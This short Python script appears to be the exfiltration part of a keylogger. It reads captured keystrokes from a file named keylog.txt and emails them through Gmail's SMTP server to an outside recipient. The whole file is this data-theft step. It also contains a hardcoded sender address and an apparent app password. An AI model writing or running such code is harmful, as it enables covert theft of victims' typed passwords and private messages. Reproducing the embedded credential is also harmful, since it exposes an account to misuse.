import smtplib


# Open a plain text file for reading.  For this example, assume that
# the text file contains only ASCII characters.
with open("./keylog.txt", 'r') as fp:
    # Create a text/plain message
    msg = fp.read()

# me == the sender's email address
# you == the recipient's email address
From = "key.log12321@gmail.com"
To = "gurtarandhillon@yahoo.com"

# Send the message via our own SMTP server, but don't include the
# envelope header.
s = smtplib.SMTP_SSL('smtp.gmail.com', 465)
s.login("key.log12321@gmail.com", "rbwo becq iref zjio")
s.sendmail(From, To, msg)
s.quit()